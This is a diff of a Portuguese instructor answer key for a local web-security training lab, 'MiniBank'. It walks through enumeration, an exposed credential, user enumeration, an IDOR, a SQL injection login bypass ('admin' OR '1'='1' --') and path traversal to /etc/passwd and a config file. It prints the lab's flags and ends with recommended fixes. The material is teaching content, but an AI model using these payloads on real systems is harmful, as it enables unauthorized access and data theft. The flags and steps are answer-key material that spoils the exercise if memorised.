@@ -1,223 +1,268 @@
 # Solution - lab-01-minibank
 
-Gabarito tecnico objetivo do lab **lab-01-minibank**.
+Gabarito técnico objetivo do lab **lab-01-minibank**.
 
 Escopo autorizado:
 
 ```text
-http://localhost:8088
-```
+http://127.0.0.1:8088
 
-## 1. Enumeracao
+Este arquivo mostra o caminho completo para capturar as flags. Use como material do instrutor ou como apoio final para alunos que já tentaram resolver o lab.
 
-Validar home:
+1. Enumeração inicial
 
-```bash
-curl -i http://localhost:8088
-```
+Acesse a aplicação no navegador:
 
-Procurar comentario HTML:
+http://127.0.0.1:8088
 
-```bash
-curl -s http://localhost:8088 | grep -i "<!--"
-```
+Observe a página inicial do MiniBank Internal Portal.
 
-Comentario esperado:
+Agora visualize o código-fonte da página:
 
-```html
+Ctrl + U
+
+Procure comentários HTML. O comentário esperado é:
+
 <!-- revisar robots.txt antes de publicar o portal legado -->
-```
 
-Ler `robots.txt`:
+Esse comentário indica que existe um arquivo robots.txt que pode conter rotas sensíveis, antigas ou esquecidas.
 
-```bash
-curl -i http://localhost:8088/robots.txt
-```
+Acesse manualmente:
+
+http://127.0.0.1:8088/robots.txt
 
 Rotas descobertas:
 
-- `/admin`
-- `/backup`
-- `/dev.txt`
-- `/download`
-- `/status`
+/admin
+/backup
+/dev.txt
+/download
+/status
 
-Status verboso:
+Acesse também:
 
-```bash
-curl -i http://localhost:8088/status
-```
+http://127.0.0.1:8088/status
 
-## 2. Credencial exposta
+Esse endpoint retorna informações verbosas da aplicação, como:
 
-Rota:
+app
+version
+env
+internal_path
+database
 
-```text
-GET /dev.txt
-```
+O /status não possui flag, mas ajuda na enumeração e no entendimento do ambiente.
 
-Acao:
+2. Credencial exposta
 
-```bash
-curl -i http://localhost:8088/dev.txt
-```
+Pelo robots.txt, foi descoberta a rota:
 
-Credencial:
+/dev.txt
 
-```text
+Acesse no navegador:
+
+http://127.0.0.1:8088/dev.txt
+
+O arquivo contém uma anotação de desenvolvimento com credencial exposta:
+
 backup_user:backup123
-```
 
-Flag:
+Também contém a flag:
 
-```text
 FLAG{credencial_exposta_capturada}
-```
 
-Validar uso da credencial:
+Valide o impacto da credencial acessando:
 
-```bash
-curl -i -u backup_user:backup123 http://localhost:8088/backup
-```
+http://127.0.0.1:8088/backup
 
-## 3. SQL Injection no login
+Quando o navegador solicitar autenticação, use:
 
-Rota:
+Usuário: backup_user
+Senha: backup123
 
-```text
-POST /login
-```
+A falha aqui é a exposição de credencial em arquivo público.
 
-Enumeracao de usuarios por mensagens de erro:
+3. Enumeração de usuários no login
 
-```bash
-curl -i -X POST http://localhost:8088/login \
-  -d "username=naoexiste" \
-  -d "password=teste"
-```
+Acesse a página de login:
+
+http://127.0.0.1:8088/login
+
+Teste um usuário inexistente:
+
+Usuário: naoexiste
+Senha: teste
 
 Resultado esperado:
 
-```text
 Usuario nao encontrado.
-```
 
-```bash
-curl -i -X POST http://localhost:8088/login \
-  -d "username=joao" \
-  -d "password=errada"
-```
+Agora teste um usuário existente com senha errada:
+
+Usuário: joao
+Senha: errada
 
 Resultado esperado:
 
-```text
 Senha invalida.
-```
 
-Essa enumeracao e intencional no lab e nao possui flag propria.
+Isso permite enumerar usuários válidos, porque a aplicação retorna mensagens diferentes para usuário inexistente e senha incorreta.
 
-Payload funcional:
+Essa falha é intencional no lab e não possui flag própria.
 
-```text
-username: admin' OR '1'='1' -- 
-password: qualquercoisa
-```
+Usuário válido identificado:
 
-O espaco apos `--` faz parte do payload para comentario MySQL.
+joao
+4. SQL Injection no login
 
-Com `curl`:
+Ainda na página de login:
 
-```bash
-curl -i -c admin.cookies \
-  --data-urlencode "username=admin' OR '1'='1' -- " \
-  --data-urlencode "password=qualquercoisa" \
-  http://localhost:8088/login
-```
+http://127.0.0.1:8088/login
 
-Capturar flag:
+Use o seguinte payload no campo de usuário:
 
-```bash
-curl -s -b admin.cookies http://localhost:8088/dashboard | grep -i "FLAG"
-```
+admin' OR '1'='1' -- 
 
-Flag:
+No campo de senha, coloque qualquer valor:
 
-```text
+qualquercoisa
+
+O espaço após -- faz parte do payload. Ele é necessário para o comentário MySQL funcionar corretamente.
+
+Ao enviar o formulário, a aplicação deve redirecionar para:
+
+/dashboard
+
+No dashboard, deve aparecer:
+
+Usuario: admin | Perfil: admin
+
+E a flag:
+
 FLAG{sqli_capturada}
-```
 
-## 4. IDOR em contas
+A falha ocorre porque a aplicação concatena o valor do campo username diretamente em uma consulta SQL. O payload força uma condição verdadeira e ignora o restante da query.
 
-Login como Joao:
+5. IDOR em contas
 
-```bash
-curl -i -c joao.cookies \
-  -d "username=joao&password=joao123" \
-  http://localhost:8088/login
-```
+Faça login com o usuário comum:
 
-Conta de outro usuario:
+Usuário: joao
+Senha: joao123
 
-```bash
-curl -s -b joao.cookies http://localhost:8088/account/2
-```
+Após o login, acesse a conta do próprio usuário:
 
-Flag:
+http://127.0.0.1:8088/account/1
 
-```text
+Agora altere manualmente o ID na URL para acessar outra conta:
+
+http://127.0.0.1:8088/account/2
+
+A aplicação permite visualizar uma conta de outro usuário sem validar se ela pertence ao usuário autenticado.
+
+Na conta /account/2, deve aparecer:
+
 FLAG{idor_capturada}
-```
 
-## 5. Path Traversal / LFI controlado
+Essa é uma falha de autorização/falha lógica: o sistema valida que existe uma sessão, mas não valida o dono do recurso acessado.
 
-Arquivo normal:
+6. Path Traversal / LFI controlado
 
-```bash
-curl -i "http://localhost:8088/download?file=public-info.txt"
-```
+Pelo robots.txt, foi descoberta a rota:
 
-Ler o relatorio que contem a pista:
+/download
 
-```bash
-curl -i "http://localhost:8088/download?file=report-q2.txt"
-```
+Acesse:
+
+http://127.0.0.1:8088/download
+
+A página mostra arquivos disponíveis para download, como:
+
+public-info.txt
+report-q1.txt
+report-q2.txt
+
+Clique primeiro em:
+
+public-info.txt
+
+Observe que a URL fica parecida com:
+
+/download?file=public-info.txt
+
+Isso mostra que a aplicação recebe o nome do arquivo pelo parâmetro file.
+
+Agora abra o relatório que contém a pista:
+
+http://127.0.0.1:8088/download?file=report-q2.txt
 
 Pista relevante:
 
-```text
 Durante a migracao, a configuracao antiga foi movida para o diretorio config.
 Arquivo revisado pela equipe: legacy.conf
-```
 
-Prova de leitura fora do diretorio permitido:
+Antes de buscar a flag, valide a falha de Path Traversal tentando ler um arquivo comum do Linux:
 
-```bash
-curl -i "http://localhost:8088/download?file=../../../../etc/passwd"
-```
+http://127.0.0.1:8088/download?file=../../../../etc/passwd
 
-O endpoint `/status` vaza:
+Se a aplicação retornar conteúdo com linhas parecidas com root:x:0:0, a leitura fora do diretório esperado foi confirmada.
 
-```text
+O endpoint /status vaza o caminho interno da aplicação:
+
 internal_path=/usr/src/app
-```
 
-Como o downloader parte de `/usr/src/app/files`, a pista `config` + `legacy.conf` leva ao arquivo legado com a flag:
+Como o downloader lê arquivos a partir de:
 
-```bash
-curl -i "http://localhost:8088/download?file=../config/legacy.conf"
-```
+/usr/src/app/files
 
-Flag:
+e a pista aponta para:
 
-```text
+config/legacy.conf
+
+é possível sair de files e acessar o diretório config com:
+
+../config/legacy.conf
+
+Acesse:
+
+http://127.0.0.1:8088/download?file=../config/legacy.conf
+
+O arquivo deve revelar:
+
 FLAG{path_traversal_capturada}
-```
+7. Flags finais
 
-## 6. Flags finais
+As quatro flags do lab são:
 
-- `FLAG{sqli_capturada}`
-- `FLAG{idor_capturada}`
-- `FLAG{credencial_exposta_capturada}`
-- `FLAG{path_traversal_capturada}`
+FLAG{credencial_exposta_capturada}
+FLAG{sqli_capturada}
+FLAG{idor_capturada}
+FLAG{path_traversal_capturada}
+8. Resumo das falhas
+Falha	Onde ocorre	Evidência
+Credencial exposta	/dev.txt	backup_user:backup123 e flag
+User Enumeration	/login	mensagens diferentes para usuário inexistente e senha inválida
+SQL Injection	/login	bypass para dashboard admin
+IDOR / falha lógica	/account/:id	usuário comum acessa /account/2
+Path Traversal	/download?file=	leitura de /etc/passwd e ../config/legacy.conf
+9. Correções recomendadas
+Credencial exposta
 
-Validar com o comando documentado em `../VALIDATION.md`.
+Remover arquivos sensíveis da pasta pública, usar variáveis de ambiente e rotacionar credenciais vazadas.
+
+User Enumeration
+
+Usar mensagem genérica para falhas de login, por exemplo:
+
+Usuário ou senha inválidos.
+SQL Injection
+
+Usar queries parametrizadas/prepared statements e nunca concatenar entrada do usuário diretamente em SQL.
+
+IDOR
+
+Validar no backend se o recurso acessado pertence ao usuário autenticado.
+
+Path Traversal
+
+Normalizar caminhos, bloquear ../, usar allowlist de arquivos e garantir que o arquivo final permaneça dentro do diretório permitido.
